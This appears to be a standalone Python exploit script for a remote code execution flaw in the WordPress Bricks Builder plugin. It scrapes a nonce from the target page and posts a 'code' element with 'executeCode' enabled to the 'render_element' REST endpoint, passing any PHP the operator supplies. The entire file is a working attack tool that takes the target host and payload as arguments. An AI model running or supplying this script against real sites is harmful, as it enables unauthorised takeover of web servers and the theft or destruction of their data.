#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup
import re
import sys

#these you can change
#host="https://vuln.blueteamer.io/"
#evil_cmd="<?php echo 'hello world'; ?>"
host=sys.argv[1]
evil_cmd=sys.argv[2]

# dont change
path="wp-json/bricks/v1/render_element"
url=host+path

def get_nonce(host):
    html = requests.get(host)
    soup = BeautifulSoup(html.text, 'html.parser')
    bricks_js = soup.find(id='bricks-scripts-js-extra')
    nonce = re.search('nonce":"(.*?)",', str(bricks_js))
    return nonce.group(1)
    
nonce=get_nonce(host)

print("Attacking:", host)
print("With nonce:",nonce)

evil_obj = {
    'nonce': nonce,
    'postId': '1234',
    'action': 'bricks_render_element',
    'element': {
        'id': 'asdfgh',
        'name': 'code',
        'settings': {
            'code': evil_cmd,
            'executeCode': True
        }
    }
}

res = requests.post(url, json=evil_obj)
print(res.text)
